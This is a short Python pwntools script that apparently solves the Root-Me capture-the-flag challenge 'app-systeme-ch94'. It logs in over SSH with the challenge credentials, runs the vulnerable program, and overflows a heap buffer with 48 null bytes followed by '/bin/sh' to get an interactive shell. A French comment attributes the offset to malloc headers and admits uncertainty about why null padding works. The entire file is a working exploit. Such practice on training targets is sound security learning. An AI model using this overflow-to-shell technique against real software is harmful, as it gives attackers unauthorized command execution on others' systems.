from pwn import *

ssh_user = "app-systeme-ch94"
ssh_password = "app-systeme-ch94"
ssh_host = "challenge03.root-me.org"
ssh_port = 2223
process_path = "./ch94"

shell = ssh(user=ssh_user, password=ssh_password, host=ssh_host, port=ssh_port)

p = shell.process([process_path])

payload = b'\x00'*48 + b'/bin/sh' # la fonction malloc a aussi des headers de 18 octets d'ou 48, pourquoi \x00 je sais pas trop mais ça marche pas avec A

p.sendlineafter(b"Enter directory you want to display : ", payload)
p.interactive()